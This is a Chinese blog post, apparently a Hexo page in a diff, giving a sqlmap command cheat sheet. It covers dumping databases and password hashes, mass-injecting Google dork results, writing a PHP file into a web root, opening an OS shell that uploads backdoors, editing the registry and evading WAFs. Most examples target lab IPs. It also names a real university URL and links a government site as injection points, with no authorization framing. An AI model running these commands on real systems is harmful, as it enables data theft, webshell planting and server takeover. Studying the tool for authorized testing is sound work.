@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>sqlmap命令集合 | madcoding’s blog</title><meta name="description" content="sqlmap命令集合"><meta name="keywords" content><meta name="author" content="madcoding"><meta name="copyright" content="madcoding"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://www.mad-coding.cn/2020/02/08/sqlmap命令集合/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="sqlmap命令集合"><meta name="twitter:description" content="sqlmap命令集合"><meta name="twitter:image" content="https://www.mad-coding.cn/img/avatar.png"><meta property="og:type" content="article"><meta property="og:title" content="sqlmap命令集合"><meta property="og:url" content="https://www.mad-coding.cn/2020/02/08/sqlmap命令集合/"><meta property="og:site_name" content="madcoding’s blog"><meta property="og:description" content="sqlmap命令集合"><meta property="og:image" content="https://www.mad-coding.cn/img/avatar.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="AppScan Standard-9.0.3.14安装破解" href="https://www.mad-coding.cn/2020/02/10/AppScan-Standard-9-0-3-14安装破解/"><link rel="next" title="python学习--&gt;python基础知识" href="https://www.mad-coding.cn/2020/02/06/python学习-python基础知识/"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?4f375d7c7c0acbaae6032e476c824100";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.mad-coding.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  highlight_copy: 'true',
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    title: '添加书签',
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天'
+
+  
+}</script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-基本命令"><span class="toc-text">0x01 基本命令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-参数：–level"><span class="toc-text">0x02 参数：–level</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-显示调试信息"><span class="toc-text">0x03 显示调试信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-风险等级"><span class="toc-text">0x04 风险等级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-取目标"><span class="toc-text">0x05 取目标</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-从文本中获取多个目标"><span class="toc-text">0x06 从文本中获取多个目标</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-获取http请求注入（用请求包注入）"><span class="toc-text">0x07 获取http请求注入（用请求包注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-处理Google搜索结果（需要挂代理）"><span class="toc-text">0x08 处理Google搜索结果（需要挂代理）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-各种参数"><span class="toc-text">0x09 各种参数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-注册表操作（不建议改，容易改崩）"><span class="toc-text">0x10 注册表操作（不建议改，容易改崩）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-暴力破解表名"><span class="toc-text">0x11 暴力破解表名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-文件读写"><span class="toc-text">0x12 文件读写</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x13-命令执行"><span class="toc-text">0x13 命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x14-WAF绕过注入"><span class="toc-text">0x14 WAF绕过注入</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/Photo/post.png)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">madcoding’s blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description">If you want to succeed, just do it.</div></div><hr><div class="menus_item"><a class="site-page" href="/ "><i class="fa-fw fa fa-home"></i><span> 首页</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-calendar"></i><span> 时间轴</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 类别</span></a><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 读书</span></a><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-file-image-o"></i><span> 相册</span></a><a class="site-page" href="/pan/"><i class="fa-fw fa fa-hdd-o"></i><span> 资源</span></a><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a><a class="site-page" href="/留言板/"><i class="fa-fw fa fa-comment"></i><span> 留言板</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title"><div class="posttitle">sqlmap命令集合</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-08<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-02-09</time><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.8k</span><span class="post-meta__separator">|</span><span>阅读时长≈: 17 分钟</span><span class="post-meta__separator">|</span><span>℃: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a>
+
+<h1 id="0x01-基本命令"><a href="#0x01-基本命令" class="headerlink" title="0x01 基本命令"></a>0x01 基本命令</h1><p>sqlmap.py –update    更新sqlmap<br>sqlmap.py -h        查看帮助<br>sqlmap.py -u “<a href="http://192.168.0.158:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.158:8006/showproducts.php?id=13&quot;</a>            这里的-u参数就是注入点</p>
+<p>sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a> –is-dba    当前用户权限 返回True的话为管理员<br>–dbs        列出所有数据库<br>–current-db    网站当前数据库<br>–users        查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问<br>–current-user    当前数据库用户<br>–passwords    列出用户密码<br>–tables -D xycms    查表  -D 相当于 -database 相当于数据库<br>–tables -D xycms –count    多加的参数相当于统计一下，表里面的行数<br>–columns -T manage_user -D xycms    列字段，-T 表名 -D 数据库名<br>–dump -C m_name,m_pwd -T manage_user -D xycms        下载数据 -C 列名 逗号分隔<br>–dump-all        转存DBMS数据库所有表项目<br>–level            测试等级(1-5)，默认为1</p>
+<blockquote>
+<p>基本的步骤：读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p>
+</blockquote>
+<p>-D    指定数据库<br>-T    指定表<br>-C    指定列<br>–dbms=mysql    指定数据库为mysql，也可以是  oracle mssql</p>
+<p>以下四个需要管理员权限：<br>–users        枚举所有用户<br>–passwords    枚举所有用户密码<br>–roles        列出数据库管理员角色<br>–privileges     列出数据库管理员权限</p>
+<p>列举数据库系统的架构：<br>sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a> –schema –batch –exclude-sysdbs</p>
+<p> –schema        是列系统架构</p>
+<p>–batch            默认选项执行，不需要再提示选项<br>–exclude-sysdbs    排除系统数据库</p>
+<h1 id="0x02-参数：–level"><a href="#0x02-参数：–level" class="headerlink" title="0x02 参数：–level"></a>0x02 参数：–level</h1><p>级别越高，检测的东西越多，确保全面性用高级别，一般用3，这个是从0开始，0-4,5个级别）</p>
+<p>共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，</p>
+<p>你也可以根据相应的格式添加自己的payload。</p>
+<p>这个参数不仅影响使用哪些payload同时也会影响测试的注入点，</p>
+<p>GET和POST的数据都会测试，<br>        HTTP Cookie在level为2的时候就会测试，<br>        HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
+<p><strong>总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</strong></p>
+<h1 id="0x03-显示调试信息"><a href="#0x03-显示调试信息" class="headerlink" title="0x03 显示调试信息"></a>0x03 显示调试信息</h1><p>-v    显示调试信息 有7个级别<br>            0、只显示python错误以及严重的信息。</p>
+<p>1、同时显示基本信息和警告信息。（默认）</p>
+<p>2、同时显示debug信息。</p>
+<pre><code>3、同时显示注入的payload。
+
+4、同时显示HTTP请求。</code></pre><p>5、同时显示HTTP响应头。</p>
+<p>6、同时显示HTTP响应页面。</p>
+<pre><code>sqlmap.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --columns -D xss -v 4
+    可以看见发送的请求头，来执行枚举列名</code></pre><h1 id="0x04-风险等级"><a href="#0x04-风险等级" class="headerlink" title="0x04 风险等级"></a>0x04 风险等级</h1><p>参数：–risk（一般和–level一起使用）</p>
+<p>共有四个风险等级，默认是1</p>
+<p>1会测试大部分的测试语句，<br>2会增加基于事件的测试语句，<br>3会增加OR语句的SQL注入测试。<br>        在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。<br>        测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
+<pre><code>sqlmap.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --level 3 --risk 3
+        这样测试的语句可以更全面一些</code></pre><h1 id="0x05-取目标"><a href="#0x05-取目标" class="headerlink" title="0x05 取目标"></a>0x05 取目标</h1><p>获取指定目标<br>        参数:-u 或者–url<br>        格式：http(s)://targeturl[:port]/[…]<br>        例如：sqlmap.py -u “<a href="http://192.168.0.240:8006/showproducts.php?id=13&quot;" target="_blank" rel="noopener">http://192.168.0.240:8006/showproducts.php?id=13&quot;</a></p>
+<h1 id="0x06-从文本中获取多个目标"><a href="#0x06-从文本中获取多个目标" class="headerlink" title="0x06 从文本中获取多个目标"></a>0x06 从文本中获取多个目标</h1><p>参数：-m</p>
+<pre><code>文件中保存url格式如下，sqlmap会一个一个检测
+www.target1.com/vuln1.php?q=foobar</code></pre><p><a href="http://www.target2.com/vuln2.asp?id=1" target="_blank" rel="noopener">www.target2.com/vuln2.asp?id=1</a></p>
+<p><a href="http://www.target3.com/vuln3/id/1" target="_blank" rel="noopener">www.target3.com/vuln3/id/1</a>*</p>
+<pre><code>比如把以上3个保存到c:\aa.txt
+sqlmap.py -m c:/aa.txt
+就会对多个目标进行检测，或者
+sqlmap.py -m c:/aa.txt --batch
+来默认检测，这样就不要自己选Y了，就执行默认选项了</code></pre><h1 id="0x07-获取http请求注入（用请求包注入）"><a href="#0x07-获取http请求注入（用请求包注入）" class="headerlink" title="0x07 获取http请求注入（用请求包注入）"></a>0x07 获取http请求注入（用请求包注入）</h1><p>参数：-r</p>
+<pre><code>sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。
+把bp抓来的请求包，保存到c:\bb.txt
+sqlmap.py -r c:\bb.txt
+对bp请求包，来进行注入
+一般对
+    post
+    搜索注入
+    http头注入
+    登录后的注入点cookie
+来进行注入</code></pre><h1 id="0x08-处理Google搜索结果（需要挂代理）"><a href="#0x08-处理Google搜索结果（需要挂代理）" class="headerlink" title="0x08 处理Google搜索结果（需要挂代理）"></a>0x08 处理Google搜索结果（需要挂代理）</h1><p>参数：-g<br>        sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。<br>        相当于谷歌边搜索边注入的<br>        sqlmap.py -g “inurl:php?id=”</p>
+<h1 id="0x09-各种参数"><a href="#0x09-各种参数" class="headerlink" title="0x09 各种参数"></a>0x09 各种参数</h1><p>1.参数：–date（post请求参数）<br>        此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。<br>        sqlmap.py -u “<a href="http://192.168.0.240:8007/login.php&quot;" target="_blank" rel="noopener">http://192.168.0.240:8007/login.php&quot;</a> –data=”username=123&amp;password=123”</p>
+<pre><code>2.参数：--param--del（指定分隔字符）
+    参数拆分字符
+
+    当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
+    sqlmap.py -u &quot;http://192.168.0.240:8007/login.php&quot; --data=&quot;username=123;password=123&quot; --param--del=&quot;;&quot;
+    这里面一般网页都是用&amp;来分隔，如果遇到；来分隔的话，这里就可以指定用；来进行多个参数查询
+
+3.参数：--cookie
+    适用于cookie注入
+    注意：一般有通用型方注入代码，弹框的时候才会用cookie注入，前提是网站接受你的cookie注入的
+    还有一种情况就是登陆后的页面来进行注入</code></pre><p>​        </p>
+<p>​    </p>
+<pre><code>4.参数：--referer
+    sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</code></pre><p>​<br>    5.参数：–headers<br>        可以通过–headers参数来增加额外的http头</p>
+<pre><code>    --hearders “client-ip:1.1.1.1&apos;” --level 3
+
+6.参数：--proxy</code></pre><p>使用<br>        –proxy代理是格式为：<a href="http://url:port。" target="_blank" rel="noopener">http://url:port。</a><br>        –hearders “client-ip:1.1.1.1’” –level 3 –proxy “<a href="http://127.0.0.1:8080&quot;" target="_blank" rel="noopener">http://127.0.0.1:8080&quot;</a></p>
+<p>​<br>    7.参数：–delay<br>        可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。<br>        sqlmap.py -u “<a href="http://192.168.0.240:8007/login.php&quot;" target="_blank" rel="noopener">http://192.168.0.240:8007/login.php&quot;</a> –delay=0.5<br>        每0.5秒，发送一个请求，把请求速度降下来，有可能会过掉waf</p>
+<pre><code>    c:\python27\sqlmap\lib\core\option.py
+    大概1425行
+    **没有，问一下
+
+8.参数：--timeout
+    可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</code></pre><p>设定重试超时</p>
+<pre><code>9.参数：--retries
+    当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</code></pre><p>设定随机改变的参数值</p>
+<pre><code>10.参数：--safe-url,--safe-freq
+    有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
+    绕过这个策略有两种方式：
+    1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
+
+    2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。
+
+
+11.参数：-p 
+    sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，
+    当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p
+
+
+    参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</code></pre><p>​<br>        告诉sqlmap，注入点在 id,user-anget 上</p>
+<pre><code>12.参数：--prefix,--suffix （相当于告诉sqlmap如何闭合）(prefix是前面, suffix是后面)（一般sqlmap会自动闭合）
+    有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。
+
+    例如，代码中是这样调用数据库的：
+    $query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 
+
+    这时你就需要--prefix和--suffix参数了：
+    sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; 
+    -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
+
+    这样执行的SQL语句变成：
+    $query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;; 
+
+
+
+13.参数：--technique
+    这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式
+    支持的探测方式如下：
+    B: Boolean-based blind SQL injection（布尔型注入）
+
+    E: Error-based SQL injection（报错型注入）
+
+    U: UNION query SQL injection（可联合查询注入）
+
+    S: Stacked queries SQL injection（可多语句查询注入）</code></pre><p>T: Time-based blind SQL injection（基于时间延迟注入）</p>
+<pre><code>    sqlamp.py -u &quot;http://192.168.0.240:8006/showproducts.php?id=13&quot; --tech=UE --flush-session --batch
+        --flush-session    是清除缓存，并且只搜索 联合查询注入 和 显错注入
+
+
+
+14.参数：--union-cols（指定联合查询有多少列，默认1-10个列，可能新版本已经加到了100个列）
+    默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。
+    设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。
+    例子：
+    --union-cols 100
+
+15.参数：--union-char（指定联合查询是用什么填充的）
+    默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，
+    而一个随机整数是成功的，这是你可以用--union-char指定UNION查询的字符。
+    例子：
+
+    --union-char &quot;null&quot;
+
+
+
+16.参数：--second-order（二阶注入,返回结果可能不在一个页面上）
+    有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，
+    这时候就需要你指定到哪个页面获取响应判断真假。--second-order后门跟一个判断页面的URL地址.
+    例子:
+    sqlmap.py -u &quot;http://127.0.0.1/aa.php&quot; --second-order &quot;http://127.0.0.1/bb.php&quot;
+
+
+
+17.参数：--dump-all,--exclude-sysdbs（--dump-all用来转存所有数据库，--exclude-sysdbs排除系统自带的表）
+
+    使用--dump-all参数获取所有数据库表的内容，可同时加上--exclude-sysdbs只获取用户数据库的表，
+    需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，
+    因为有的管理员会把他当初用户数据库一样来使用它。
+
+
+
+18.参数：--search,-C,-T,-D（用来寻找特定的表，数据库，列）
+
+    --search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。
+    可以在一下三种情况下使用：
+    -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。
+    -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名
+
+    -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。
+    例子：
+    sqlmap.py -u &quot;http://127.0.0.1/aa.php?id=1&quot; --search -C &quot;name,pwd&quot; -D xycms
+            在xycms里面搜索name,pwd列
+            选项1是模糊匹配 2是精准匹配
+
+
+19.参数：--udf-inject,--shared-lib（显错注入，root权限可能会上传udf，相当于--os-shell的第二种方案）
+
+    你可以通过编译MySQL注入你自定义的函数（UDFs）或PostgreSQL在windows中共享库，DLL，
+    或者Linux/Unix中共享对象，sqlmap将会问你一些问题，上传到服务器数据库自定义函数，
+    然后</code></pre><p>根据你的选择执行他们，当你注入完成后，sqlmap将会移除它们。</p>
+<pre><code>20.参数：-s,-t,--batch
+
+    参数：-s
+
+    sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，
+    就可以用这个参数。</code></pre><p>保存HTTP(S)日志</p>
+<pre><code>    -s c:\ab.txt
+
+    参数：-t
+    这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。
+    -t c:\abc.txt
+
+    参数：--batch（主要就是默认执行，一路默认选择走下去）
+    用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
+
+
+
+
+
+21.参数：--charset（设置一下编码）（默认是utf-8）
+    不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：
+    --charset=GBK
+
+
+
+22.参数：--flush-session（清除缓存）
+    如果不想用之前缓存这个目标的session文件，可以使用这个参数。 会清空之前的session，
+    重新测试该目标。</code></pre><p>自动获取form表单测试</p>
+<pre><code>23.参数：--hex（丢一些数据编码的时候可能会加这个）
+
+    有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：
+    例子：
+    sqlmap.py -u &quot;http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1&quot; --banner --hex -v 3 --parse-errors
+
+
+24.参数：--output-dir（指定一下保存的路径）
+    参数：--output-dir
+    sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 
+    例如：--output-dir=/tmp</code></pre><p>从响应中获取DBMS的错误信息</p>
+<pre><code>    参数：--parse-errors（主要就是用来显示错误信息）
+    有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。
+
+
+25.参数：--smart,--mobile
+    参数：--smart（-m 的时候可能会加这个，加这个可以节省时间）
+    有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，
+    可以使用此参数。</code></pre><p>例子：<br>        sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1&quot;</a> –batch –smart</p>
+<pre><code>26.参数：--mobile（模拟手机请求）
+
+    有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</code></pre><p>例如：<br>        sqlmap.py -u “<a href="http://www.target.com/vuln.php?id=1&quot;" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1&quot;</a> –mobile</p>
+<pre><code>27.参数：--identify-waf（用来识别和检测waf）
+    sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。
+
+28.参数：--check-waf（检测你的waf类型，手工检测 加 and 1=1，可能就会出来）
+    WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰，如果怀疑目标有此防护的话，
+    可以使用此参数来测试。 sqlmap将会使用一个不存在的参数来注入测试</code></pre><p>例如对一个受到ModSecurity WAF保护的MySQL<br>        例子：<br>        sqlmap.py -u “<a href="http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;" target="_blank" rel="noopener">http://192.168.21.128/sqlmap/mysql/get_int.php?id=1&quot;</a> –identify-waf -v 3</p>
+<h1 id="0x10-注册表操作（不建议改，容易改崩）"><a href="#0x10-注册表操作（不建议改，容易改崩）" class="headerlink" title="0x10 注册表操作（不建议改，容易改崩）"></a>0x10 注册表操作（不建议改，容易改崩）</h1><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。<br>        当然，当前连接数据库的用户也需要有权限操作注册表。<br>读取注册表值</p>
+<pre><code>1.参数：--reg-read        写入注册表值
+2.参数：--reg-add        </code></pre><p>删除注册表值<br>        3.参数：–reg-del        注册表辅助选项<br>        4.参数：–reg-key，–reg-value，–reg-data，–reg-type<br>        需要配合之前三个参数使用，例子：<br>        sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1" target="_blank" rel="noopener">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> –reg-add –reg-key=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test –reg-<br>type=REG_SZ –reg-data=1</p>
+<h1 id="0x11-暴力破解表名"><a href="#0x11-暴力破解表名" class="headerlink" title="0x11 暴力破解表名"></a>0x11 暴力破解表名</h1><p>（union，error不会用到，时间盲注，延迟注入，access数据库，mysql5.0以下的需要直接跑的会用到）<br>        参数：–common-tables<br>        当使用–tables无法获取到数据库的表时，可以使用此参数。<br>通常是如下情况：</p>
+<p>1、MySQL数据库版本小于5.0，没有information_schema表。</p>
+<p>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。</p>
+<p>3、当前用户没有权限读取系统中保存数据结构的表的权限。<br>暴力破解的表在txt/common-tables.txt文件中，<br>        你可以自己添加。</p>
+<p>Xx  –common-tables -D testdb</p>
+<p>暴力破解列名<br>        参数：–common-columns</p>
+<pre><code>   与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。
+
+   Xx  --common-columns  -T text -D testdb
+
+
+
+   POST登录框注入（建议跑包最为推荐）
+   注入点：http://testasp.vulnweb.com/Login.asp
+
+   几种注入方式：
+   ./sqlmap.py -r search-test.txt -p tfUPass 
+
+（-p指定注入参数，-r指定抓的请求包）
+   sqlmap -u http://testasp.vulnweb.com/Login.asp --forms
+（自动加载表单）
+   sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;    （指定参数来进行探测）
+
+
+   搜索框注入（一般就是bp抓个包跑包）
+   sqlmap.py -r search-test.txt
+
+
+   伪静态注入（一般加个*，指定一下来跑就行了）
+   注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html
+
+   sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.htm
+
+   base64编码注入
+   sqlmap -u http://ha.cker.in/index.php?tel=LTEnIG9yICc4OCc9Jzg5 --tamper base64encode.py –dbs</code></pre><p><a href="http://lm.yichang.gov.cn/" target="_blank" rel="noopener">http://lm.yichang.gov.cn/</a></p>
+<pre><code>请求时间延迟
+参数：--time-sec
+
+当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒
+例如：
+--time-sec=5
+
+执行sql语句（只能查询select 语句）
+--sql-query=&quot;select @@version&quot;
+
+--sql-shell
+
+
+sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。
+
+如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，
+需要测试是否支持多语句执行SQL语句。</code></pre><h1 id="0x12-文件读写"><a href="#0x12-文件读写" class="headerlink" title="0x12 文件读写"></a>0x12 文件读写</h1><p>（从数据库服务器中读取文件）</p>
+<p>参数：–file-read</p>
+<pre><code>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
+读取的文件可以是文本也可以是二进制文件。
+sqlmap.py -u &quot;http://192.168.2.3:81/about/show.php</code></pre><p>?lang=cn&amp;id=22” –file-read=”C:\Inetpub\wwwroot\mysql-php\1.php”</p>
+<pre><code>文件上传
+参数：--file-write,--file-dest
+
+当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。
+上传的文件可以是文本也可以是二进制文件。
+sqlmap.py -u &quot;http://192.168.2.129/article.php?id=5&quot; --file-write=&quot;C:\1.php&quot; --file-dest=&quot;/var/www/html/x.php&quot;</code></pre><h1 id="0x13-命令执行"><a href="#0x13-命令执行" class="headerlink" title="0x13 命令执行"></a>0x13 命令执行</h1><p>（记准–os-shell,用的多一些）</p>
+<p>参数：–os-cmd,–os-shell</p>
+<pre><code>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</code></pre><p>在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()。<br>cmd            执行cmd命令（win）<br>shell            执行当前用户命令<br>–os-shell        会传两个后门，一个任意文件上传，一个脚本后门</p>
+<pre><code>自动上传 脚本文件
+
+返回shell</code></pre><h1 id="0x14-WAF绕过注入"><a href="#0x14-WAF绕过注入" class="headerlink" title="0x14 WAF绕过注入"></a>0x14 WAF绕过注入</h1><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br>        例如：</p>
+<pre><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; -v 3 --dbs  --batch --tamper &quot;space2morehash.py&quot;
+大概以下三种</code></pre><p>space2hash.py<br>        base64encode.py<br>        charencode.py</p>
+<pre><code>sqlmap -u &quot;http://192.168.159.1/news.php?id=1&quot; -v 3 --dbs  --batch --tamper=space2hash.py,base64encode.py,charencode.py
